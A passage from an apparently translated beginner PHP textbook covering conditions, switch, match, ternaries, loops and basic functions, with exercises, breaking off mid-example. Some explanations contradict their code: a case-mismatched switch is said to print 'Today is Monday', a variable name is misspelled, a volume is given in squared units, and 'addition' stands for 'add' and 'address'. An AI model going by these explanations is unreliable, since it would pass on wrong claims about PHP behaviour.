In summary, nested control structures, such as those used in the previous examples, are effective for making decisions based on multiple conditions. However, as the number of conditions increases, the readability and maintainability of the code can quickly deteriorate. The complexity of nested control structures can make code difficult to understand and manage, increasing the risk of errors and making future modifications more laborious.

 

It's therefore important to pay close attention to the design and readability of your code, avoiding excessively nested control structures wherever possible. Whenever possible, it's best to use alternatives such as switch structures or functions to simplify the logic of your code and make it easier to understand and maintain.

## Multiple conditions

Multiple conditions, also known as combined conditions, allow us to evaluate several Boolean expressions in a single control statement. These conditions are generally used when we need to check several criteria simultaneously in order to make a decision.

 

The use of logical operators simplifies control structures by reducing the number of nested conditional blocks. This makes code easier to read and maintain.

 

### Use of the logical AND operator (&&) :

 

The logical AND operator (&&) returns TRUE if all conditions combined are true. Here's an example:

 

<?php

  
 $a \= 10;  
 $b \= 25;  
 if ($a \> 5 && $b < 100) {  
 echo "You succeeded, condition true";  
 } else {  
 echo "Sorry, condition false";  
 }

  
?>

 

Executing this code gives you the following result:

 

![Image](images/image-38.png)

 

In this example, we have two variables $a and $b. We use the logical operator AND (&&) to combine two conditions:

 

The if condition combines two conditions: $a > 5 and $b > 100 using the logical operator &&.

Since both conditions are true, the combined condition $a > 5 && $b < 100 is also true. Consequently, the if block is executed and the message "You have succeeded, condition true" is displayed.

 

### Use of the logical OR operator (||) :

 

The logical OR operator (||) returns TRUE if at least one of the combined conditions is true. Here's an example:

 

<?php  
 $role \= "admin";  
 $permission \= "read";  
  
 if ($role \== "admin" || $permission \== "write") {  
 echo "You have the necessary authorizations.";  
 } else {  
 echo "You do not have the necessary authorization";  
 }  
?>

 

When you run this code, you will get the following result:

 

![Image](images/image-39.png)

 

In this example, the condition of the if statement combines the two conditions $role == "admin" and $permission == "write" using the logical OR operator (||). The first condition, $role == "admin", is verified because the variable $role contains the value "admin". Since we're using the logical OR operator, if at least one of the conditions is true, the entire if statement will be true. Thus, the combined condition is also considered true. As a result, the if block is executed.

 

### Combining logic operators :

 

We can also combine several logical operators for more complex conditions. Here's an example:

 

<?php  
 $age = 25;  
 $role = "admin";  
  
 if (($age >= 18 && $role == "admin") || $role == "moderateur") {  
 echo "You have access to advanced features";  
 } else {  
 echo "You do not have access to advanced features";  
 }  
?>

 

If you run this code, you should get the following result:

 

![Image](images/image-40.png)

 

In this example, we have two conditions combined using the logical OR operator (||). The first condition, ($age >= 18 && $role == "admin"), checks whether the user is aged 18 or over AND has the role of administrator. This condition is true only if the two sub-conditions that make it up, i.e. $age >= 18 and $role == "admin", are both true. In our case, both sub-conditions are indeed true.

 

The second condition, $role == "moderator", checks whether the user has the role of moderator.

 

Since we're using the logical OR operator (||), the entire if statement will be true if at least one of the conditions is true. In our example, since the first combined condition is true ($age >= 18 && $role == "admin"), the user will have access to advanced features, leading to the message "You have access to advanced features".

##  

## The switch control structure

PHP's switch control structure is a powerful tool that lets you execute different actions depending on the value of an expression.

Think of it as a switch that you can toggle between different positions. Each position represents a different case. If the switch is set to the case corresponding to the value of your expression, then the actions associated with that case will be executed.

###  

### Syntax and uses

 

The general syntax of the switch structure is as follows:

 

![Image](images/image-41.png)

 

 

In this syntax :

 

*   **expression: This is** the expression you wish to evaluate. It can be a variable, a constant or an arbitrary expression.
*   **value1**, **value2**, **...** These are the values you wish to compare with the expression. Each value corresponds to a specific case.
*   **instruction1**, **instruction2**, **...** These are the instructions to be executed if the expression matches the corresponding value.
*   **break**: This instruction tells PHP to exit the switch structure once the instructions for the corresponding case have been executed. Without a break, PHP will continue to execute instructions for subsequent cases, which can lead to unexpected behavior.
*   **default**: This is an optional option that specifies the code to be executed if none of the values matches the expression. 

 

The switch structure evaluates the expression once and compares its result with each value specified in the case. If a match is found, the corresponding instructions are executed until a break is encountered. If no match is found and a **default** clause is present, the default instructions are executed.

 

Here's a concrete example to illustrate the idea: suppose you want to display a different message depending on the day of the week. You can use the switch structure for this:

 

<?php  
 $day = "monday";  
 switch ($day) {  
 case "Monday":  
 echo "Today is Monday.";  
 break;  
 case "tuesday":  
 echo "Today is Tuesday.";  
 break;  
 case "Wednesday":  
 echo "Today is Wednesday.";  
 break;  
 default:  
 echo "Today is not Monday, Tuesday or Wednesday.";  
 }  
?>

 

In this example, we have our $day (switch) variable, and we've specified different "cases" for each day of the week. If the value of $day matches one of the specified days, then the message associated with that day will be displayed. If none of the cases match, then the default block will be executed, displaying a default message. In the case of this example, since the value of $day is "Monday", executing this code will display the sentence "Today is Monday".

You can use the switch structure when you have several cases to handle based on the value of a single expression. It makes your code clearer and more concise, especially when you have a series of conditions to evaluate one after the other. The switch structure is particularly useful when you have a variable with a finite set of possible values and you need to perform different actions according to these values.

 

Instead of using the switch structure, we could write the preceding code using the conditional structure if...elseif...else as follows:

 

<?php

  
 $day \= "Monday";

  
 if ($day \=== "Monday") {  
 echo "Today is Monday.";

  
 } elseif ($day \=== "Tuesday") {  
 echo "Today is Tuesday.";

  
 } elseif ($day \=== "Wednesday") {  
 echo "Today is Wednesday.";

  
 } else {  
 echo "Today is not Monday, Tuesday or Wednesday.";  
 }

  
?>

 

 

These two codes perform essentially the same task, which is to check the value of the variable $day and display a message based on this value. However, they use different control structures to achieve the same result.

On the whole, both approaches are valid and can be used according to the specific needs of the program and the developer's preference.

However, if we have several cases to test where each case requires a comparison with a single value, the switch-case approach is generally preferred. This is due to its clear, concise structure, which makes it easy to handle multiple cases without repeating the comparisons each time.

 

The use of switch-case is particularly appropriate when the variable to be tested has a limited number of possible values and we want to execute different blocks of code according to these values. This approach also avoids code duplication and makes the code more readable and maintainable.

 

### Grouping of several cases in switch

 

PHP's switch structure offers the possibility of grouping multiple cases within a single block, providing a more concise and organized approach to managing different conditions. Here's a concrete example to illustrate this idea:

 

<?php  
  
 $day = "thursday";  
  
 switch ($day) {  
 case "Monday":  
 case "tuesday":  
 case "wednesday":

  
 echo "This is the beginning of the work week.";  
 break;  
 case "thursday":  
 case "friday":  
 echo "The end of the week is approaching.";  
 break;  
 case "saturday":  
 case "sunday":  
 echo "It's the weekend!";  
 break;  
 default:  
 echo "Day not recognized.";  
 }  
  
?>

 

In this example, the days "Monday", "Tuesday" and "Wednesday" are grouped together in the same block, as they all require the same action: to indicate the start of the work week. In other words, if the value of $day is "Monday", "Tuesday" or "Wednesday", the program displays "This is the start of the work week" and exits switch.

Similarly, the days "Thursday" and "Friday" are grouped together to indicate that the weekend is approaching, and the days "Saturday" and "Sunday" are grouped together to indicate the weekend. If neither case matches, the default block is executed to indicate that the day is not recognized.

In this example, since the value of the variable $day is "Thursday", executing this code will display "The end of the week is approaching".

 

![Image](images/image-42.png)

 

## The match control structure

The **match** control structure, introduced in PHP 8, provides a more concise and expressive alternative to the switch structure for comparing a value to a list of cases and executing the corresponding code. It works in a similar way to the switch structure, but with a more simplified and expressive syntax.

The syntax of the match control structure is as follows:

 

 

![Image](images/image-43.png)

 

In this syntax :

 

*   **expression: This is** the expression you wish to evaluate. It can be a variable, a constant or an arbitrary expression.
*   **value1, value2, ...** These are the values you wish to compare with the expression. Each value corresponds to a specific case.
*   **instruction1, instruction2, ...** These are the instructions to be executed if the expression matches the corresponding value.
*   **default**: This is an optional option that specifies the code to be executed if none of the values matches the expression. It's the equivalent of the "default" clause in the switch structure.

 

The match structure evaluates the expression and compares its result with each specified value. If a match is found, the corresponding instructions are executed. If no match is found and a default clause is present, the default instructions are executed.

 

Here's a simple example illustrating the use of the match structure:

 

<?php  
  
 $day = "friday";  
  
 $message = match ($day) {  
 'Monday' => "Today is Monday.",  
 'Tuesday' => "Today is Tuesday.",  
 'Wednesday' => "Today is Wednesday.",  
 default => "Today is not Monday, Tuesday, or Wednesday."  
 };  
  
 echo $message;  
  
?>

 

In this PHP code, we have a variable $day that contains the string "friday". Then, we use the match structure to check the value of the variable $day against several cases. Each case corresponds to a day of the week: 'Monday', 'Tuesday', 'Wednesday'. If the value of $day matches one of these cases, we set the variable $message with an appropriate message for that day. If the value of $day does not match any of these cases, we use the default case to set the message corresponding to an unspecified day of the week.

 

![Image](images/image-44.png)

 

Finally, we use the echo statement to display the message defined in the variable $message.

 

The use of the match structure in PHP simplifies and makes it easier to read the checking of multiple cases based on the value of a variable. This often replaces the use of multiple if and else if statements.

 

### Save match result in a variable

 

The match control structure can store its result in a variable when you want to use the result later in your code. This can be useful when you need to use the value associated with a corresponding condition in several places in your program.

 

For example, you can store the match result in a variable when you need to display the result in different parts of your web page, or when you need to perform other operations based on this result.

 

Using a variable to store the match result also makes your code more readable and modular, as you can assign a meaningful name to the variable to represent the result corresponding to a specific condition.

Here's an example to illustrate this idea:

 

<?php  
  
 $state = "California";  
  
 $message = match ($state) {  
 "California" => "You're in the Golden State!",  
 "New York" => "Welcome to the Empire State!",  
 "Texas" => "Howdy from the Lone Star State!",  
 "Florida" => "Sunshine State greetings from Florida!",  
 default => "You're not in California, New York, Texas, or Florida."  
 };  
  
 echo $message;  
  
?>

 

This PHP code uses the new match pattern matching structure to check the value of the variable $state against multiple cases. Here is a detailed explanation:

 

$state = "California"; : We assign the string "California" to the variable $state.

 

$message = match ($state) { ... }; : We use the match structure to compare the value of $state against different cases.

 

"California" => "You're in the Golden State!", : If the value of $state is "California", then the message "You're in the Golden State!" is assigned to the variable $message.

 

"New York" => "Welcome to the Empire State!", : If the value of $state is "New York", then the message "Welcome to the Empire State!" is assigned to the variable $message.

 

"Texas" => "Howdy from the Lone Star State!", : If the value of $state is "Texas", then the message "Howdy from the Lone Star State!" is assigned to the variable $message.

 

"Florida" => "Sunshine State greetings from Florida!", : If the value of $state is "Florida", then the message "Sunshine State greetings from Florida!" is assigned to the variable $message.

 

default => "You're not in California, New York, Texas, or Florida." : If the value of $state does not match any of the previous cases, then the message "You're not in California, New York, Texas, or Florida." is assigned to the variable $message.

 

echo $message; : Finally, the message contained in the variable $message is displayed on the screen using the echo statement.

 

In summary, this code displays a different message depending on the value of the variable $state, using the match structure to simplify the checking of different cases.

 

![Image](images/image-45.png)

 

## Ternary conditional structures

PHP's ternary conditional structures offer a concise and efficient way of writing conditional statements in a single line of code. They are particularly useful when you need to evaluate a simple condition and return a value depending on the result of that condition.

The general syntax of a ternary conditional structure is as follows:

 

### ![Image](images/image-46.png)

 

Let's explain this syntax:

 

The condition is evaluated first.

*   If the condition is true, the value following the question mark "**?**" is assigned to the variable $variable.
*   If the condition is false, the value following the "**:**" is assigned to the variable $variable.

Here's a simple example to illustrate the use of ternary conditional structures in PHP :

 

<?php

  
 $age = 20; 

 $message = ($age >= 18) ? "You are an adult." : "You are a minor";  
 echo $message;  
  
?>

 

In this example :

 

*   If the age is greater than or equal to 18, the message You are an adult." is assigned to the $message variable.
*   Otherwise, the message "You are a minor" is assigned to the variable $message.

 

In this example, with the value of the variable $age equal to 20, the condition $age >= 18 is evaluated as true. Consequently, the expression following the "?" operator is assigned to the $message variable, giving the following result:

 

![Image](images/image-47.png)

 

Ternary conditional structures can make your code more concise and readable when used appropriately. However, it's important not to overuse them in order to maintain code readability. Use them judiciously for simple, straightforward conditions.

 

## Conclusion

In this chapter on conditional structures in PHP, we've explored the various tools and techniques available for controlling the flow of program execution. From simple if-else statements to more complex structures like switch and match, we've seen how to write logical conditions to make decisions based on input data. By understanding these concepts, PHP developers can create more robust and flexible scripts, capable of adapting to different situations and producing customized results according to the needs of the application. By making judicious use of conditional structures, developers can make their programs more efficient and intelligent, offering a better user experience.

## EXERCISES

 

### Exercise 4

 

Write a script that checks whether a number stored in a variable is positive, negative or zero.

 

### Exercise 5

 

Write a program to check students' skill development assessed on a scale of 100 using conditional instructions.

*   If the competency level is 80% or more, the student will be in the first group.
*   If the degree of competence is between 50% and 80%, the student will be in the second group. 
*   If the degree of competence is between 30% and 50%, the student will be in the third group. 
*   If the competency level is below 30%, the student will fail.

 

### Exercise 6

 

Write a conditional script to test whether a number is a multiple of both 3 and 5.

 

### Exercise 7

 

Write a program to display the day of the week (e.g. Monday) based on numbers, using switch statements.

*   Day 1 will be considered as Monday
*   If the number is not between 1 and 7, display "invalid number" by default.

# Chapter 3

# Loops in PHP

 

 

 

Welcome to the chapter on loops in PHP! Loops are essential tools in program development, as they enable instructions to be executed repeatedly depending on certain conditions. Whether you're a beginner or an experienced developer, this chapter will guide you through the different types of loops available in PHP, showing you how to use them effectively to automate tasks, browse data collections and create more dynamic programs.

 

The loops we will study in this chapter include :

 

*   The while loop
*   The do-while loop
*   The for loop

 

We'll focus on the use, benefits and best practices for implementing each of these loops. You'll discover how these loops can be used to browse and manipulate data once you've studied them.

 

Get ready to dive into the captivating world of loops in PHP, where you'll learn how to manipulate the execution flow of your code in a precise and elegant way. By mastering loops, you'll be able to create more dynamic and powerful PHP applications. So, without further ado, let's explore the inner workings of PHP loops together!

 

 

## The while loop

The **while** loop is a control structure in PHP that allows you to execute a block of code repeatedly as long as a specified condition is true. It functions as follows:

 

**Step 1**: Initialize condition: Before entering the **while** loop, a condition is defined. This condition is a Boolean expression that is evaluated before each iteration of the loop.

 

**Step 2:** Condition evaluation: The condition is evaluated to determine whether it is true or false.

 

**Step 3**: If the condition is true (i.e. returns true), the block of code inside the loop, i.e. the "Instructions" block, is executed. Once this block of code has been executed, the program returns to step 2 and re-evaluates the condition.

 

**Step 4**: If the condition is false (i.e. returns false), the while loop ends and program execution continues after the loop.

 

![Image](images/image-48.png)

 

To use the while loop effectively, it's essential to ensure that the specified condition will eventually become false at some point, otherwise you risk creating an infinite loop. You must also correctly update the variables used in the condition within the code block to ensure that the condition will eventually be false.

 

In short, the **while** loop allows you to execute a block of code repeatedly as long as a specified condition remains true. It's a powerful tool for creating flexible control structures in your PHP programs. 

 

The basic syntax of the **while** loop is as follows:

 

![Image](images/image-49.png)

 

Here's an example to illustrate the while loop:

 

<?php  
  
 $counter = 1;  
  
 // Use the while loop to display numbers from 1 to 10  
 while ($counter <= 10) {  
 echo "The counter is: $counter <br>";  
 $counter++;  
 }  
  
?>

 

In this code, we initialize a $counter variable to the value 1. Then we use a while loop to display the numbers from 1 to 10.

 

**Step 1**: Initialize the $counter variable to 1.

 

**Step 2**: The condition specified in the while loop is $counter <= 10. As long as this condition is true, the block of code inside the loop is executed.

 

**Step 3**: Each time the loop is iterated, the code inside the block is executed. In our case, we display the current counter value using echo. Then, at the end of each iteration, we increment the $counter value by 1 using the ++ operator. This ensures that the counter increases progressively with each iteration.

 

Repeat: Steps 2 to 3 are repeated as long as the condition $counter <= 10 remains true. Once $counter reaches 11, the condition becomes false and the while loop ends.

 

This code will display numbers from 1 to 10 using a while loop.

 

![Image](images/image-50.png)

 

The while loop is extremely flexible and can be used in a variety of scenarios. It is particularly useful when you need to execute a block of code an indefinite number of times according to a condition.

## The do ... while loop

The **do...while** loop is similar to the while loop, but with one important difference: the condition is evaluated after the block of code has been executed. This means that the block of code is always executed at least once, even if the condition is false from the outset.

 

Here's how the do...while loop works:

 

*   **Step 1: First,** the block of code (instruction) inside the loop is executed a first time without checking the condition.
*   **Step 2:** Check condition: Once the block of code has been executed, the condition specified after the while keyword is evaluated. 
*   **Step 3:** If the condition is true, the block of code (instruction) is re-executed.
*   **Step 4:** Otherwise, the loop ends

 

Repeat: Steps 1 to 3 are repeated as long as the condition specified after the **while** keyword remains true.

 

![Image](images/image-51.png)  

The general syntax of the **do...while** loop is as follows:

 

![Image](images/image-52.png)

 

Here's an example of how to use the do...while loop in PHP:

 

<?php  
  
 $counter \= 1;  
  
 do {  
 echo "The counter is: $counter <br\>";  
 $counter++;  
 } while ($counter <= 10);  
  
?>

 

In this example, the $counter variable is initialized to 1.

*   Next, the block of code inside the braces is executed. It displays the counter value.
*   After the code block has been executed, the condition $counter <= 10 is evaluated. As long as this condition is true, the code block is rerun.
*   The counter is incremented at each iteration.
*   The loop repeats until the condition becomes false, i.e. when $counter reaches the value 11.

 

As the condition is checked at the end of each iteration, the code block is executed at least once, even if the initial condition is false.

The result returned by this code is exactly the same as that of the previous example using the while loop.

 

But note that the main difference between the two loops is that the do...while loop guarantees execution of the block of code at least once, whereas the while loop may not execute the block of code at all if the condition is false from the start.

To illustrate the difference, let's suppose, for example, that we initialize the variable $counter to 20. In this case, the condition ($counter <= 10) is false from the start, because $counter is initialized to 20, which is greater than 10.

Consequently, in the case of the while loop, the block of code inside the loop will never be executed.

However, in the case of the do...while loop, the block of code inside the do...while loop will be executed at least once, as the condition is evaluated after the block has been executed. Even if the condition ($counter <= 10) is false from the start, the block of code will still be executed once before checking the condition. So, even if $counter is initialized to 20, the message will be displayed once.

## The for loop

The for loop is a control structure used to repeat a block of code a specified number of times. It is particularly useful when you know in advance the number of iterations you wish to perform.

 

The general syntax of the **for** loop is as follows:

 

![Image](images/image-53.png)

 

*   **Initialization**: This is where you initialize your loop control variable.
*   **The condition**: This condition is evaluated before each loop iteration. If true, the block of code is executed. Otherwise, the loop ends.
*   **Incrementing**: This step modifies the loop control variable at each iteration.

Note that these three components are separated by a semicolon ( ;).

 

The **for** loop offers a concise way of writing loops that require initialization, a condition and incrementation.

 

Let's move on to a concrete example to better understand how it works. Suppose we want to display numbers from 1 to 5.

 

<?php  
 for ($i \= 1; $i <= 5; $i++) {  
 echo $i . "<br\>";  
}  
?>

 

In this example :

 

*   The initialization is **$i = 1**, where we initialize our control variable $i to 1.
*   The condition is **$i <= 5**, where the loop will continue to run as long as variable $i is less than or equal to 5.
*   The increment is **$i++**, where we increment the value of $i at each iteration.

 

The result of this code will be the display of numbers from 1 to 5.

 

![Image](images/image-54.png)

 

Let's look at another example to display the multiplication table for the number 7 :

 

<?php  
  
 for ($i \= 1; $i <= 10; $i++) {  
 $result \= 7 \* $i;  
 echo "7 x $i \= $result <br\>";  
 }  
  
?>

 

In this code, each iteration of the for loop calculates the product of 7 and the value of $i and stores the result in the variable $result, then displays the result.

 

As a result, running this code displays the multiplication table for 7.

 

![Image](images/image-55.png)

 

Example:

 

The following example illustrates the use of a PHP for loop to generate HTML title tags with different levels of hierarchy. The loop traverses the title levels from 1 to 6 and displays a sentence with the corresponding title level.

 

<?php  
  
 for ($i \= 1; $i <= 6; $i++) {  
 echo "<h$i>Here is the $i level title</h$i\>";  
 }  
  
?>

 

Executing this code gives the following result:

 

![Image](images/image-56.png)

 

## Comparing the while loop and the for loop

Although the while and for loops have different syntaxes, they both fulfill the same role, namely to repeat the execution of a block of code as long as a given condition is true. However, in some cases, one may be preferred to the other, depending on the context.

In general, the for loop is used more frequently than the while loop, but this can also depend on the preferences and habits of individual developers.

Indeed, both for and while loops perform the same function of repeating the execution of a block of code as long as a condition is verified. But when should you choose one over the other?

 

The answer is quite simple: if you know in advance the number of repetitions required, it's best to use the for loop. On the other hand, if the number of repetitions is indeterminate and depends on a condition, the while loop is more appropriate. This allows you to maintain a more flexible loop structure, suitable for situations where the number of repetitions is not predefined.

 

### Summary

 

To decide which type of loop to use, it's important to determine whether the number of iterations is known in advance. If this is the case, the for loop is often preferred. On the other hand, if the block of code is to be executed at least once, the do...while loop is more appropriate. Finally, if the block is to be executed solely on the basis of an initial condition, the while loop is often used. It's essential to choose the loop that best suits the specific needs of each situation. The following diagram illustrates the use of for, do...while and while loops.

 

![Image](images/image-57.png)

##  

## Conclusion

In conclusion, this chapter on loops in PHP has enabled us to discover powerful tools for managing repetition in our programs. We've explored while, do...while and for loops, as well as their differences and appropriate uses. These structures give us the flexibility to execute blocks of code a set number of times, or until a condition is met.

 

We've also discussed situations where one loop may be preferable to the other, depending on the complexity of the problem to be solved. By understanding the nuances of each loop and practicing their use in different scenarios, you'll be able to write more efficient and readable programs.

 

It's important to note that this chapter hasn't covered the **foreach** loop, which will be studied in detail in the chapter on arrays. In the meantime, keep exploring and experimenting with **while**, **do...while** and **for** loops, as they are fundamental elements of your PHP development toolbox.

 

 

## EXERCISES

 

### Exercise 8:

 

Write a program to display integers from 10 to 50, using the while loop.

 

### Exercise 9

 

Using the for loop, write a program to calculate the product of all integers from 1 to 20 (1x2x3x4x5x.....x19x20).

Then display the result.

 

### Exercise 10

 

Write the multiplication table for 7 (all numbers from 1 to 100), using the for loop. This table should be presented as an unordered list.

 

### Exercise 11

 

Write a program to calculate the following sum:

 

1+3+3² + 3³ + 3⁴ + 3⁵ + ... ... + 3^(20)

 

 

# Chapter 4

# Functions and Generators in PHP

#  

#  

Welcome to the chapter on functions in PHP! Functions are an essential part of any programming language, and PHP is no exception. They enable code to be organized in a modular way, reused efficiently and made more readable and maintainable.

 

In this chapter, we'll take an in-depth look at the different facets of functions in PHP. We'll start with an introduction to the definition and use of functions, including their declaration, calling and handling of arguments and return values. Next, we'll look at the scope of variables and functions, and the use of PHP's predefined functions.

 

We'll also dive into more advanced topics, such as recursive functions, anonymous functions, functions with default arguments and functions with a variable number of arguments. We'll see how to include external files containing functions, and how to implement good function naming and documentation practices.

 

We'll illustrate the usefulness of functions through practical examples, showing how they can be used to solve common problems encountered in PHP development.

 

Whether you're a beginner or an experienced developer, this chapter will provide you with the knowledge and skills you need to master the art of creating and using functions in PHP. So let's dive in together on this exciting journey of function discovery in PHP!

 

 

## Introduction to PHP functions

Functions are blocks of PHP code that can be defined once and reused in several places within a script, or even in several different scripts. They enable similar instructions and operations to be grouped together, making code easier to manage and maintain. In PHP, functions play a crucial role in the organization and modularity of programs.

 

### Definition of a function :

 

A function in PHP is a set of instructions that perform a specific task and can take arguments as input to customize their behavior. It can also return an output value if required. The definition of a function includes a **name**, a list of **optional arguments** and a body containing the **instructions** to be executed.

 

### Benefits of using :

 

**Reusability**: Functions avoid code redundancy by grouping similar functions together, making it easier to reuse code in different contexts.

**Modularity**: By dividing code into distinct functions, it becomes easier to manage, understand and maintain.

**Abstraction**: Functions abstract implementation details, making code easier to understand and modify.

**Organization**: Functions can be used to organize code by grouping related functions together, making the code clearer and more readable.

 

### General structure of a PHP function :

 

The general structure of a PHP function includes the following elements:

 

![Image](images/image-58.png)

 

**function**: Keyword used to declare a function in PHP.

**function\_name:** Name of the function, which must be unique in the script.

**(param1, param2, ...)** : List of **optional** parameters that the function can accept as input.

**{ }**: Delimiters indicating the beginning and end of the function body, where the instructions to be executed are defined.

The general structure of a PHP function is simple yet powerful, offering great flexibility for creating customized, reusable functionality in your applications.

## Declaring and using functions

### Functions with no arguments

 

As mentioned above, in PHP, a function is declared using the **function** keyword, followed by the function name and parentheses, which may contain optional function parameters. Some functions require no arguments to perform their tasks. They are defined without parameters between the parentheses.

 

Here is an example of functions with no arguments:

 

Example:

 

<?php

  
 function displayMessage() {  
 $message \= "Hello and welcome to the world of PHP.";  
 echo $message;  
 }

  
?>

 

 

This code defines a function called **displayMessage** which takes no arguments, declares a variable $message containing the string "Hello and welcome to the world of PHP.", then displays this variable using echo. But if you run this code, you won't get any results! In fact, at this stage, although the function is defined, it won't execute automatically until it's called somewhere in the program. The function call can be made in several places in the code, allowing the same block of code to be reused in different places without having to rewrite it each time. In other words, a function call is required to execute the block of code it contains.

 

To call the displayMessage() function, simply addition the function's call line to your script (outside the function) as follows:

 

<?php  
 function displayMessage() {  
 $message \= "Hello and welcome to the world of PHP.";  
 echo $message;  
 }

  
 displayMessage();  
?>

 

Executing this code gives the following result:

 

![Image](images/image-59.png)

 

### Functions with arguments

 

Arguments are the values passed to a function when it is called. These values can be used inside the function to perform operations. Here's an example of a function taking two arguments:

 

<?php

 //Definition of the function that calculates the sum  
 function addition($a, $b) {  
 $sum \= $a \+ $b;  
 echo "The sum is: $sum " ;  
 }  
  
 addition(10, 20); // Call function with arguments  
?>

 

In this example, we define a function called addition() which takes two parameters, $a and $b, representing the two numbers to be added. Inside the function, we add the two parameters and store the result in a variable $sum. Then, we use the echo statement to display the result along with a message indicating the calculated sum.

 

After defining the function, we call it, passing two values, 10 and 20, as arguments. The function additions these two values and displays the result, "The sum is: 30".

 

![Image](images/image-60.png)

 

### Returning values from a function

 

A function can return a value at the point where it is called, using the **return** keyword. Here's an example of a function that calculates the volume of a cylinder:

 

<?php  
 //Definition of the function that calculates the volume  
 function cylinder\_volume($radius,$height) {  
 $volume = M\_PI\*$radius\*\*2\*$height;  
 return $volume;  
 }  
 echo cylinder\_volume(3,10) ;  
?>

 

In this example, the **cylinder\_volume** function takes two parameters as input: the radius and height of the cylinder. It then calculates the cylinder's volume using the formula where π is the mathematical constant π. The result is stored in the variable $volume. The function then returns this volume value using the **return** keyword.

When the function is called with echo cylinder\_volume(3, 10), it calculates the volume of the cylinder with a radius of 3 units and a height of 10 units, then displays this volume using the echo command, which in this example gives a volume of **282.74** units squared.

 

Let's look at another example to show that a function can be called any number of times:

 

<?php

  
 //Definition of the function that returns the double of a number  
 function double($number) {  
 return $number \* 2;  
 }

  
?>

 

 

Once the function has been defined, it can be called at any time and as many times as required in the script.

 

<?php  
  
 function double($number) {  
 return $number \* 2;  
 }  
  
 //Function calls  
 echo double (3); //Calculates the double of 3  
 echo "<br>" ;  
 echo double (10); //Calculates double 10  
 echo "<br>" ;  
 echo double (12); //Calculates the double of 12  
 echo "<br>" ;  
 echo double (87); //Calculates double 87  
 echo "<br>" ;  
 echo double (65); //Calculates double 65  
 echo "<br>" ;  
  
?>

 

Executing this code gives the following result:

 

![Image](images/image-61.png)

 

### Functions with default settings

 

In this section, we'll look at functions with default parameters. These functions allow you to define default values for certain parameters, meaning that these parameters can be omitted when the function is called.

Here is the general syntax for defining a function with default parameters:

 

![Image](images/image-62.png)

 

 

In this syntax, $param1 is a mandatory parameter, while $param2 is an optional parameter with a default value.

 

When the function is called, if no argument is passed for $parametre2, its default value will be used. Otherwise, the value passed during the call will replace the default value.

 

Here's an example of how to use functions with default parameters:

 

<?php

  
 function greet($name \= "My friend") {  
 echo "Hello, $name!";  
 }  
  
 // Function calls with and without parameter specification  
 greet(); // Display "Hello, My friend!"  
 echo "<br\>"; // Line break  
 greet("Alice"); // Display "Hello, Alice!  
  
?>

 

In this example, the **greet()** function accepts a **$name** parameter with a default value of "My friend". When the function is called with no arguments, it uses this default value. When an argument is passed, it replaces the default value, hence the following result obtained from executing this code:

 

![Image](images/image-63.png)

 

 

Functions with default parameters provide additional flexibility when defining functions, allowing developers to specify default behaviors while leaving the possibility of customizing them as required.

 

Example 2:

 

<?php  
  
 // Function definition   
 function display\_name($firstname, $lastname = "Mercier") {  
 // Checks if the name is not "Mercier".  
 if ($lastname != "Mercier") {  
 echo "Your last name is $lastname and your first name is $firstname";  
 } else {  
 echo "Your first name is: $firstname";  
 }  
 }  
 // call the display\_name function with a single argument ("Amandine")  
 display\_name("Amandine");  
 echo "<br>";  
  
 // call the display\_name function with two arguments ("Sarah" and "Smith")  
 display\_name("Sarah", "Smith");  
  
?>

 

This code defines a **display\_name()** function that takes a mandatory parameter $firstname and an optional parameter $lastname with a default value of "Mercier". When the function is called, it checks whether the lastname is different from "Mercier". If so, it displays both the first and last names, otherwise it displays only the first name.

 

If you run this code, you will get the following result:

 

![Image](images/image-64.png)

 

*   When we call the function with a single argument (display\_name("Amandine")), it uses the first name "Amandine" and the default last name "Mercier", so it displays "Your first name is: Amandine".

 

*   When we call the function with two arguments (display\_name ("Sarah", "Smith")), it uses the first name "Sarah" and the last name "Dupont" specified, so it displays "Your last name is Smith and your first name is Sarah".

 

### Functions with parameter by reference

 

To introduce this section, let's consider the code of a simple function for doubling a number passed as a parameter:

 

<?php  
  
 function double($number) {  
 $number \*= 2;  
 }  
  
 $x = 10;  
 double($x); // call the double() function  
 echo $x;  
  
?>

 

This code defines a function called "double" which takes a parameter $number. Within the function, the value of "$number" is multiplied by 2 using the combined assignment operator "**\*=**". This means that the "$number" variable will be doubled.

Next, a variable $x is initialized to 10. The "double" function is then called with $x as argument.

 

If you run this code, you'll get the value of variable $x. In this example, you'll always get 10, because the "double" function uses a copy of the value of $x, not a reference to the variable itself.

 

Sometimes, however, you may need the function to directly modify the value of the variable passed as an argument, and for this change to remain valid throughout the rest of the program. For this, you can use the notion of parameter by reference.

 

Parameters by reference allow a function to directly modify the value of a variable passed as an argument. To declare a parameter by reference, use the **&** symbol before the parameter name in the function signature.

 

If we take the same example as above and addition the **&** symbol in front of the function parameter, this will allow the "double" function to directly modify the value of the **$x** variable, so you'll get 20 when $x is displayed after the function is called.

 

<?php  
  
 function double(&$number) {  
 $number \*= 2;  
 }  
  
 $x = 10;  
 double($x); // call the double() function  
 echo $x;  
  
?>

 

### Reference functions vs. value functions

 

Functions with parameters by reference allow you to directly modify the value of a variable passed as an argument to the function, and this change remains effective even after the function has been exited. Unlike functions with parameters by value, which work with a copy of the value of the variable passed as argument, functions with parameters by reference act directly on the original variable.

 

Understand how functions with parameters by reference work:

 

*   When you call the function and pass a parameter by **reference**, PHP stores the memory addition of the original variable in an internal reference.
*   Inside the function, when you use this parameter, PHP uses this internal reference to directly access the original variable and make the necessary modifications.
*   Any modification made to the variable through this parameter directly affects the original variable, as PHP works with the memory addition of the variable itself, and not with a copy of its value.

 

This allows the function to modify the original variable directly, and these modifications are retained even after the function has been exited. This is why parameters by reference are used when you need to modify the value of a variable and want this modification to be visible outside the function.

 

Understand how functions with parameters by value work:

 

*   When you call the function and pass a parameter by **value**, PHP creates a **copy** of the original variable value and assigns it to a **new memory location** for use within the function.
*   Inside the function, any modification made to this parameter by value affects only this **copy of** the value and does not modify the original variable outside the function.
*   When the function ends, the copy of the parameter value per value is **destroyed** and the original variable remains unchanged.

 

This means that modifications made to a parameter by value inside a function remain local to that function and are not visible outside it. Parameters by value are generally used when you wish to use the value of a variable inside a function without modifying the original variable outside the function.

###  

### Functions with named parameters

 

In PHP, functions can also accept so-called named parameters, offering greater flexibility when calling functions with multiple parameters. Consider the following code:

 

<?php  
  
 function infos\_display($lastname, $firstname, $age, $isactive){  
 return "Last Name: $lastname, First Name: $firstname, Age: $age, Active: $isactive";  
 }  
  
 $person\_info = infos\_display("Dupont", "Jean\_marc", 32, True);  
 echo $person\_infos;  
